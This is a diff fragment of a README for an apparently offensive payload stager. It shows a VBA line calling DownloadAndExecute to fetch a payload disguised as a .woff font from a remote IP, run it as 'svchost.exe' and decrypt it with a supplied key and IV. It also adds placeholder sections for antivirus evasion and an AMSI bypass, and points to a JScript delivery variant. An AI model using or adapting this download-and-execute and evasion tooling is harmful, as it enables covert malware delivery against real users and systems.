@@ -112,6 +112,13 @@ Finally add the call of `DownloadAndExecute` to trigger the stager instantiation
     o.DownloadAndExecute "https://192.168.X.X:8080/hello.woff", "svchost.exe", "deflate9", "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT", "8y/B?E(G+KbPeShV"
 ```
 
+### AV Evasion
+TODO Implement AV Evasion for VBA
+
+### Amsi bypass
+
+TODO Implement AMSI bypass for VBA
+
 ## JScript
 
 You can also create JScript payloads to deliver the dll via java script. Follow allong but transfer the methodolgy to JS. I believe you are smart enough to figure out how to do.
